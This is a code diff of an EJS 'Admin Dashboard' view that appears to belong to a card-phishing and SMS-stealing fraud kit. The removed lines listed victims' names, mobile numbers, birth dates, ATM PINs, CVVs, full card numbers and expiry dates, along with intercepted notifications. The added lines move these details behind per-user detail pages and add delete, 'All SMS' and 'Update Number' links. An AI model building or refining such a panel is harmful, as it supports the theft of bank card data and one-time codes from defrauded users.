@@ -1,4 +1,3 @@
-<!-- views/dashboard.ejs -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,14 +5,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Dashboard</title>
     <link rel="stylesheet" href="css/dashboard.css">
-    
+    <style>
+        /* Styling for clickable rows */
+        tr.clickable-row {
+            cursor: pointer;
+        }
+        tr.clickable-row:hover {
+            background-color: #f2f2f2;
+        }
+    </style>
 </head>
 <body>
     <header>
         <h1>Admin Dashboard</h1>
-        <!-- Settings Icon for Updating Admin Number -->
         <div class="settings-icon">
-            <a href="/settings"><img src="/public/images/settings-icon.png" alt="Settings"></a>
+            <a href="/settings">Update Number</a>
+            <br>
+            <a href="/sms">All SMS</a>
         </div>
     </header>
 
@@ -21,46 +29,39 @@
         <section id="user-data">
             <h2>User Data</h2>
             <table>
-                <thead>
-                    <tr>
-                        <th>Name</th>
-                        <th>Mobile</th>
-                        <th>DOB</th>
-                        <th>Card Last Six</th>
-                        <th>ATM Pin</th>
-                        <th>CVV</th>
-                        <th>Full Card Number</th>
-                        <th>Expiry Date</th>
-                    </tr>
-                </thead>
                 <tbody>
-                    <% users.forEach(user => { %>
-                    <tr>
-                        <td><%= user.name %></td>
-                        <td><%= user.mobile %></td>
-                        <td><%= user.dob %></td>
-                        <td><%= user.cardLastSix %></td>
-                        <td><%= user.atmPin %></td>
-                        <td><%= user.cvv %></td>
-                        <td><%= user.fullCardNumber %></td>
-                        <td><%= user.expiryDate %></td>
-                    </tr>
-                    <% }) %>
+                    <% users.forEach(function(user) { %>
+                        <tr 
+                            class="clickable-row" 
+                            data-href="/detail/<%= user._id %>"
+                        >
+                            <td><img src="/public/images/avatar.png" alt="avatar"></td>
+                            <td><%= user.name %></td>
+                            <td>
+                                <a href="/detail/<%= user._id %>">View Details</a>
+                            </td>
+                            <td>
+                                <form action="/delete/<%= user._id %>" method="POST" onsubmit="return confirm('Are you sure you want to delete this user?');">
+                                    <button type="submit" class="delete-button">Delete</button>
+                                </form>
+                            </td>
+                        </tr>
+                    <% }); %>
                 </tbody>
             </table>
         </section>
-
-        <section id="notifications">
-            <h2>Notifications</h2>
-            <ul>
-                <% notifications.forEach(notification => { %>
-                    <li>
-                        <strong><%= notification.sender %>:</strong> <%= notification.title %> - <%= notification.body %>
-                    </li>
-                <% }) %>
-            </ul>
-        </section>
     </main>
 
+    <script>
+        // JavaScript to make rows clickable
+        document.addEventListener('DOMContentLoaded', function () {
+            const rows = document.querySelectorAll('.clickable-row');
+            rows.forEach(row => {
+                row.addEventListener('click', function () {
+                    window.location.href = this.dataset.href;
+                });
+            });
+        });
+    </script>
 </body>
 </html>
